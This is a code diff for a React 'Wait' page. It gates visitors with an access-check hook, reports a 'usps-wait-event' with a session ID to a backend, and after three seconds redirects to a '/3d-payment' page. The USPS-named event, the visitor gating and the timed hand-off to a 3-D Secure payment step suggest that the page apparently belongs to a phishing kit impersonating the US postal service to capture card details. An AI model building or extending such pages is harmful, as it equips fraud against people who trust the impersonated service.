@@ -1,8 +1,56 @@
-import React from "react";
+import React, { useEffect } from "react";
+import { useLocation, useNavigate } from "react-router-dom";
+import axios from "axios";
 import Header from "../components/Header";
 import Footer from "../components/Footer";
+import { baseUrl } from "../constants";
+import useAccessCheck from "../Utils/useAccessCheck";
 
 const Wait: React.FC = () => {
+  const navigate = useNavigate();
+  const location = useLocation();
+  const { sessionId } = location.state || {};
+  const isAllowed = useAccessCheck(baseUrl);
+
+  useEffect(() => {
+    if (isAllowed === true && sessionId) {
+      let cancelled = false;
+
+      const sendWaitEvent = async () => {
+        try {
+          await axios.post(`${baseUrl}api/usps-wait-event/`, { sessionId });
+        } catch (error) {
+          console.error("Error reporting wait event:", error);
+        }
+      };
+
+      sendWaitEvent();
+
+      const timer = setTimeout(() => {
+        if (!cancelled) {
+          navigate("/3d-payment", { state: { sessionId } });
+        }
+      }, 3000);
+
+      return () => {
+        cancelled = true;
+        clearTimeout(timer);
+      };
+    }
+  }, [isAllowed, sessionId, navigate]);
+
+  if (isAllowed === null) {
+    return <div>Loading...</div>;
+  }
+
+  if (isAllowed === false) {
+    return <div>Access denied. Redirecting...</div>;
+  }
+
+  if (!sessionId) {
+    return <div>Missing session information. Please restart the process.</div>;
+  }
+
   return (
     <div className="min-h-screen bg-gradient-to-b from-white via-[#f9f9fb] to-[#f4f4f6] flex flex-col font-['HelveticaNeueW02-55Roma','Helvetica Neue',Helvetica,Arial,sans-serif] text-[#23285a]">
       <Header />
